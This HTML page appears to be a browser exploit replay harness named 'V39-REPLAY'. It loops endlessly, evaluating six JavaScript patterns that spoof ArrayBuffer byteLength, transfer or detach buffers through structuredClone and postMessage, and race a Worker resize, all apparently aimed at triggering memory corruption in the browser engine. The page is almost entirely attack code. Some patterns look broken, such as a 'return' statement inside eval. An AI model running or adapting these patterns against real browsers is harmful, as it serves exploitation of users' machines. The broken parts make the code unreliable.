<!doctype html>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>V39-REPLAY</title>
<body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
<div id=o>[V39-REPLAY] byteLength-getter + transfer variants</div>
<script>
const o=document.getElementById('o');
const log=m=>{o.textContent+="\n"+m;};
window.addEventListener('error',e=>log("[ERROR] "+e.message));
log("[*] start");
const PATS=[
 // P0: v39 Pattern 2 exact - getter + transfer
 "var ab=new ArrayBuffer(512,{maxByteLength:8192});var ta=new Uint8Array(ab);Object.defineProperty(ab,'byteLength',{get:function(){return 0x7fffffff;}});var c=structuredClone(ta,{transfer:[ab]});'fake-size:'+c.byteLength",
 // P1: same but plain clone (no transfer)
 "var ab=new ArrayBuffer(512,{maxByteLength:8192});var ta=new Uint8Array(ab);Object.defineProperty(ab,'byteLength',{get:function(){return 0x7fffffff;}});var c=structuredClone(ta);'clone:'+c.byteLength",
 // P2: value instead of getter + transfer
 "var ab=new ArrayBuffer(512,{maxByteLength:8192});var ta=new Uint8Array(ab);Object.defineProperty(ab,'byteLength',{value:0x7fffffff});var c=structuredClone(ta,{transfer:[ab]});'value+transfer:'+c.byteLength",
 // P3: 0x80000000 getter + transfer
 "var ab=new ArrayBuffer(512,{maxByteLength:8192});var ta=new Uint8Array(ab);Object.defineProperty(ab,'byteLength',{get:function(){return 0x80000000;}});var c=structuredClone(ta,{transfer:[ab]});'2g:'+c.byteLength",
 // P4: detached-buffer via postMessage in byteLength getter (v39 Pattern 6 style)
 "var ab=new ArrayBuffer(256);var ta=new Uint8Array(ab);var evil={byteLength:{valueOf:function(){try{postMessage(ab,[ab]);}catch(e){}return 256;}}};try{structuredClone(ta,evil);}catch(e){}return 'cb-detach'",
 // P5: resize-in-worker during transfer (v39 Pattern 0 style)
 "var ab=new ArrayBuffer(1024,{maxByteLength:4096});var ta=new Uint8Array(ab);var w=new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){var d=e.data;try{d.resize(2048);}catch(x){}}'])));w.postMessage(ab);try{structuredClone(ta,{transfer:[ab]});}catch(e){}w.terminate();'worker-race'",
];
(async()=>{
  let pass=0;
  while(true){
    pass++;
    for(let i=0;i<PATS.length;i++){
      log("P"+i+" pass="+pass);
      try{ const r=eval(PATS[i]); log("P"+i+" -> "+r); }
      catch(e){ log("P"+i+" "+e.name); }
      await new Promise(r=>setTimeout(r,40));
    }
  }
})();
</script>
